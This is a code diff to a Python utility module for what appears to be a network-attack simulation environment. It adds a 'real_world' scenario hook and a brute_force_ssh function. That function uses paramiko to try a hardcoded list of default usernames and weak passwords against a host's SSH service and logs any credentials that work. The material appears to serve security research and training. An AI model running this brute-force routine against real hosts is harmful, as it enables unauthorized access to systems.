@@ -9,12 +9,14 @@ sys.path.append(path.dirname(path.dirname(path.abspath(__file__))))
 from env.scenarios import scenario_configuration
 from env.scenarios import smaller_scenario_configuration
 from env.scenarios import tiny_scenario_configuration
+from env.scenarios import real_world_scenario_configuration
 from env.game_components import IP, Data, Network, Service, GameState, Action, ActionType, Observation
 import netaddr
 import logging
 import csv
 from random import randint
 import json
+import paramiko
 
 def read_replay_buffer_from_csv(csvfile:str)->list:
     """
@@ -408,10 +410,10 @@ class ConfigParser():
         elif scenario == "scenario1_tiny":
             cyst_config = tiny_scenario_configuration.configuration_objects
         elif scenario == "real_world":
-            cyst_config = 'real_world'
+            cyst_config = real_world_scenario_configuration.configuration_objects
         else:
             cyst_config = 'scenario1'
-        return cyst_config
+        return scenario, cyst_config
 
     def get_type_world(self):
         """
@@ -440,6 +442,42 @@ class ConfigParser():
             randomize_goal_every_episode = False
         return randomize_goal_every_episode
 
+def brute_force_ssh(host:str, port:int)->list:
+    """
+    Function to brute scan ssh
+    """
+
+    def ssh_bruteforce(hostname, port, username, password):
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        logging.info(f"Bruteforcing SSH on {host}:{port}")
+        
+        try:
+            ssh.connect(hostname, port=port, username=username, password=password)
+            # Password found
+            logging.info(f"Host: {host}:{port}. Password found for username {username}: {password}")
+            return True
+        except paramiko.AuthenticationException:
+            # Failed password
+            return False
+        except Exception as e:
+            logging.info(f"Error: {e}")
+            return False
+        finally:
+            ssh.close()
+
+    usernames = ['root', 'admin', 'test']
+    # Define a list of passwords to try
+    passwords = ['root', 'toor', '1234', '12345', '123456']
+
+    # Attempt SSH connection with each password
+    for user in usernames:
+        for password in passwords:
+            if ssh_bruteforce(host, port, user, password):
+                # Password found
+                return [user, password]
+    return [False, False]
+
 if __name__ == "__main__":
     state = GameState(known_networks={Network("1.1.1.1", 24),Network("1.1.1.2", 24)},
             known_hosts={IP("192.168.1.2"), IP("192.168.1.3")}, controlled_hosts={IP("192.168.1.2")},
@@ -448,3 +486,4 @@ if __name__ == "__main__":
                         IP("192.168.1.2"):{Data("McGiver", "data2")}})
     
     print(state_as_ordered_string(state))
+
